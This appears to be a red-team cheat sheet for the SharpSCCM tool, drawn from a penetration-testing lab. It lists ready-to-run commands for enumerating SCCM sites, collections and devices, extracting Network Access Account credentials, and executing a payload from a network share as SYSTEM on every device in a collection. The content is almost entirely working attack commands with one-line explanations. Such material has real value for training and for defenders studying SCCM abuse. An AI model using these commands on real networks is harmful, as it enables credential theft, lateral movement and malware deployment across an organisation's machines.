[GitHub Link](https://github.com/Mayyhem/SharpSCCM)


## local site-info

---

Enumerates SCCM.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
```


## get site-info

---

Checks DACL for machines that have full control over the AD.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner
```


## get collections

---

Enumerates all the collections available in the groups the current user is in.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
```


## get collection-members

---

Enumerates the members of a certain collection.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner
```


## get devices

---

Enumerates devices.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
```

### For User

`-u` will only return devices where the given user was the last to login.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
```


## get class-instances

---

Returns the class instances of a collection.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner
```


## local naa

---

Returns the Network Access Account Credentials.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
```


## exec

---

Executes commands on every device in a collection.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
```

### Force SYSTEM

`-s` forces the command to run with SYSTEM privileges.

```
C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```